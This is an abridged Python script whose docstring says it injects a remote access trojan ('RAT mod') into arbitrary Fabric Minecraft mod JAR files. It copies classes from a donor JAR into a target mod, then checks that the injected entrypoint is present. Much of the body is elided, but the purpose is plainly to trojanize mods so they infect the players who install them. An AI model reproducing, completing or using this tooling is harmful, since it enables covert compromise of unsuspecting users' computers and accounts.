#!/usr/bin/env python3
"""Inject the RAT mod (template.EntryPoint) into any other Fabric mod JAR."""
...
DEFAULT_DONOR = ROOT / "jooon-rat-standalone" / "build" / "libs" / "template-1.0.0.jar"
...
def inject_rat(target_jar: Path, output_jar: Path, donor_jar: Path, overwrite: bool, backup: bool) -> list[str]:
    ...
    with zipfile.ZipFile(donor_jar, "r") as donor, zipfile.ZipFile(target_jar, "r") as target:
        ...
        # collect classes / resources to copy
        to_copy = set()
...
def verify(output_jar: Path) -> list[str]:
    ...
    with zipfile.ZipFile(output_jar, "r") as jar:
        ...
        ep_plain = DONOR_ENTRYPOINT_CLASS in client_ep
        lines.append(f"  entrypoint plain match: {ep_plain}")
...
def parse_args(argv: list[str]) -> argparse.Namespace:
    ...
    parser.add_argument("--target", "-t", required=True, type=Path, help="Target Fabric mod JAR to inject into")
